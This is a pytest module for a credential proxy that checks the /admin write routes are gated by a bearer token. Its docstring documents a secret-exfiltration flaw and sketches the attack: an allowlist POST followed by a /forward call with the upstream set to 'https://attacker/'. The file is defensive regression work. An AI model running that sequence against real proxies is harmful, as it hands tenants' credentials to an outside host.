"""The ``/admin`` surface must not be writable by whoever can reach the pod.

B-31 ②. ``STREAM-F-DESIGN`` § 4.4 says the admin API is "仅 mTLS
SAN=control-plane 可达"; no such restriction exists anywhere in the code,
the Service is a plain ClusterIP, and the repo carries no NetworkPolicy.
Sandboxes reach this pod already — they point ``HTTPS_PROXY`` at port 8081
of it — so the reachable set is at least "every pod in the cluster", and
plausibly wider. (Whether a sandbox can also open 8080 on the same pod is
not verified here; the gate does not depend on the answer.)

That matters because the admin surface is not merely informational —
it is the write side of the only control on ``/forward``:

    POST /admin/allowlist   {tenant, agent, version, secret_ref}
    POST /forward           X-Expert-Work-Upstream: https://attacker/

``CredentialProxy.forward`` resolves ``secret_ref`` from the secret store
and injects it as ``Authorization: Bearer`` on a request to whatever
upstream URL the caller named — the URL is never validated. Registering
your own allowlist row is therefore enough to have the proxy hand any
tenant secret to an address you choose.

The three write/invalidate routes have **zero callers** in the repo (only
the docs describe intended ones), so gating them closed breaks nothing.
``/admin/health`` stays open: the kubelet probes hit it.
"""

from __future__ import annotations

import re
from uuid import UUID, uuid4

import pytest
from aiohttp.test_utils import TestClient, TestServer

from credential_proxy.app import create_app
from credential_proxy.cache import SecretCache
from credential_proxy.domain import AllowlistKey
from credential_proxy.settings import CredentialProxySettings

_TOKEN = "admin-token-for-tests"


class _Allowlist:
    def __init__(self) -> None:
        self.keys: set[AllowlistKey] = set()

    async def is_allowed(self, key: AllowlistKey) -> bool:
        return key in self.keys

    async def add(self, key: AllowlistKey) -> None:
        self.keys.add(key)

    async def remove_agent_version(
        self, tenant_id: UUID, agent_name: str, agent_version: str
    ) -> int:
        return 0


def _app(*, admin_token: str | None) -> tuple[object, _Allowlist, SecretCache]:
    allowlist = _Allowlist()
    cache = SecretCache(max_size=8, ttl_s=60.0)
    settings = CredentialProxySettings(admin_token=admin_token)
    app = create_app(settings, proxy=object(), allowlist=allowlist, cache=cache)  # type: ignore[arg-type]
    return app, allowlist, cache


def _entry() -> dict[str, str]:
    return {
        "tenant_id": str(uuid4()),
        "agent_name": "code-reviewer",
        "agent_version": "1.0.0",
        "secret_ref": "anthropic/api-key",
    }


# --------------------------------------------------------------- unconfigured


@pytest.mark.asyncio
async def test_unset_token_closes_the_admin_surface_rather_than_opening_it() -> None:
    """An unset token must not read as "no gate configured, let it through" —
    that is exactly the shape this bug had."""
    app, allowlist, _cache = _app(admin_token=None)

    async with TestClient(TestServer(app)) as client:  # type: ignore[arg-type]
        resp = await client.post("/admin/allowlist", json=_entry())

    assert resp.status == 503
    assert allowlist.keys == set(), "a refused write must not reach the store"


@pytest.mark.asyncio
async def test_health_is_reachable_without_a_token_when_unconfigured() -> None:
    """The kubelet probes this before anything is configured."""
    app, _allowlist, _cache = _app(admin_token=None)

    async with TestClient(TestServer(app)) as client:  # type: ignore[arg-type]
        resp = await client.get("/admin/health")

    assert resp.status == 200


# ----------------------------------------------------------------- configured


@pytest.mark.asyncio
async def test_write_without_a_bearer_token_is_refused() -> None:
    app, allowlist, _cache = _app(admin_token=_TOKEN)

    async with TestClient(TestServer(app)) as client:  # type: ignore[arg-type]
        resp = await client.post("/admin/allowlist", json=_entry())

    assert resp.status == 401
    assert allowlist.keys == set()


@pytest.mark.asyncio
async def test_write_with_the_wrong_token_is_refused() -> None:
    app, allowlist, _cache = _app(admin_token=_TOKEN)

    async with TestClient(TestServer(app)) as client:  # type: ignore[arg-type]
        resp = await client.post(
            "/admin/allowlist",
            json=_entry(),
            headers={"Authorization": "Bearer not-the-token"},
        )

    assert resp.status == 401
    assert allowlist.keys == set()


@pytest.mark.asyncio
async def test_write_with_the_right_token_is_allowed() -> None:
    """The gate has to have an open path, or it is untested closure."""
    app, allowlist, _cache = _app(admin_token=_TOKEN)

    async with TestClient(TestServer(app)) as client:  # type: ignore[arg-type]
        resp = await client.post(
            "/admin/allowlist",
            json=_entry(),
            headers={"Authorization": f"Bearer {_TOKEN}"},
        )

    assert resp.status == 201
    assert len(allowlist.keys) == 1


@pytest.mark.asyncio
async def test_cache_invalidate_is_gated_too() -> None:
    app, _allowlist, cache = _app(admin_token=_TOKEN)
    cache.put((uuid4(), "anthropic/api-key"), "sk-value")

    async with TestClient(TestServer(app)) as client:  # type: ignore[arg-type]
        refused = await client.post("/admin/cache/invalidate")
        assert refused.status == 401

        accepted = await client.post(
            "/admin/cache/invalidate", headers={"Authorization": f"Bearer {_TOKEN}"}
        )
        assert accepted.status == 204


@pytest.mark.asyncio
async def test_health_stays_open_when_a_token_is_configured() -> None:
    app, _allowlist, _cache = _app(admin_token=_TOKEN)

    async with TestClient(TestServer(app)) as client:  # type: ignore[arg-type]
        resp = await client.get("/admin/health")

    assert resp.status == 200


# ------------------------------------------------------------------ self-audit


def _concrete(path: str) -> str:
    """Fill a canonical aiohttp path's ``{param}`` segments with values that
    parse — the gate runs before the handler, but a route that ever stops
    401-ing should fail on the assertion, not on a malformed path."""
    return re.sub(r"\{(\w+)\}", lambda m: str(uuid4()) if m[1] == "tenant" else "x", path)


@pytest.mark.asyncio
async def test_every_admin_route_except_health_is_gated() -> None:
    """The net for routes added later. Enumerates what the app actually
    registered instead of restating the list here — a new ``/admin/...``
    route with no gate fails this without anyone remembering to update it."""
    app, _allowlist, _cache = _app(admin_token=_TOKEN)

    targets = [
        (route.method, _concrete(route.resource.canonical))  # type: ignore[union-attr]
        for route in app.router.routes()  # type: ignore[attr-defined]
        if route.resource is not None
        and route.resource.canonical.startswith("/admin/")
        and route.resource.canonical != "/admin/health"
    ]
    assert targets, "no /admin routes found — the enumeration is broken, not the gate"

    async with TestClient(TestServer(app)) as client:  # type: ignore[arg-type]
        for method, path in targets:
            resp = await client.request(method, path)
            assert resp.status == 401, f"{method} {path} answered {resp.status} without a token"


@pytest.mark.asyncio
async def test_the_data_plane_is_not_gated() -> None:
    """``/forward`` authenticates by allowlist, not by the admin token; the
    orchestrator calling it must not need one."""
    app, _allowlist, _cache = _app(admin_token=_TOKEN)

    async with TestClient(TestServer(app)) as client:  # type: ignore[arg-type]
        resp = await client.post("/forward", data=b"{}")

    # 400 = it reached the handler and complained about missing headers.
    assert resp.status == 400
